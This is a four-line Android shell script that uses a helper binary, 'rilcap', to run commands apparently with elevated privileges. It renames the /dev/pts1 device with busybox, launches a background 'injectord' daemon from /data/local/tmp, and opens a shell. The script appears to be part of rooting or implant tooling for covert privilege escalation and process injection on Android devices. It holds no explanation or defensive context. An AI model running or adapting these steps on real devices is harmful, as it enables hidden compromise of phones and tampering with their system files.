#!/system/bin/sh

rilcap blw
rilcap qzx "/data/local/tmp/busybox mv /dev/pts1 /dev/pts1real"
rilcap qzx "/data/local/tmp/injectord &"
rilcap qzx sh
